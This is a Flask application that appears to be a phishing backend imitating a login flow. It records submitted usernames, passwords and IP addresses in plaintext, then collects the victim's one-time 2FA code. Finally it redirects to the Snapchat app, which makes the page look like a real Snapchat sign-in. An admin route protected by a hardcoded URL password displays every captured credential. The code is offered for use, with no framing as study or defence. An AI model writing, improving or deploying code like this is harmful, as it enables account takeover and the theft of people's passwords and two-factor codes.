from flask import Flask, render_template, request, redirect, url_for, session
import sqlite3
from datetime import datetime
import os

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'

def init_db():
    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS login_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT NOT NULL,
            password TEXT NOT NULL,
            timestamp DATETIME NOT NULL,
            ip_address TEXT NOT NULL,
            otp_code TEXT
        )
    ''')
    conn.commit()
    conn.close()

init_db()

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def handle_login():
    username = request.form['username']
    password = request.form['password']
    ip_address = request.environ.get('HTTP_X_FORWARDED_FOR', request.remote_addr)
    timestamp = datetime.now()
    
    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('''
        INSERT INTO login_attempts (username, password, timestamp, ip_address)
        VALUES (?, ?, ?, ?)
    ''', (username, password, timestamp, ip_address))
    conn.commit()
    conn.close()
    
    session['username'] = username
    return redirect(url_for('otp'))

@app.route('/otp')
def otp():
    if 'username' not in session:
        return redirect(url_for('login'))
    return render_template('otp.html')

@app.route('/verify-otp', methods=['POST'])
def verify_otp():
    otp_code = request.form['otp_code']
    username = session.get('username')
    if not username:
        return redirect(url_for('login'))

    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('SELECT id FROM login_attempts WHERE username = ? ORDER BY timestamp DESC LIMIT 1', (username,))
    row = cursor.fetchone()
    if row:
        attempt_id = row[0]
        cursor.execute('UPDATE login_attempts SET otp_code = ? WHERE id = ?', (otp_code, attempt_id))
        conn.commit()
    conn.close()

    # ✅ إعادة التوجيه إلى تطبيق Snapchat
    return redirect("snapchat://")

@app.route('/admin')
def admin():
    password = request.args.get('password')
    if password != 'A554399a':  # 🔐 غيّر كلمة السر هنا حسب رغبتك
        return "Unauthorized: Please provide correct password in URL like /admin?password=123456", 401

    conn = sqlite3.connect('login_attempts.db')
    cursor = conn.cursor()
    cursor.execute('SELECT * FROM login_attempts ORDER BY timestamp DESC')
    attempts = cursor.fetchall()
    conn.close()
    return render_template('admin.html', attempts=attempts)

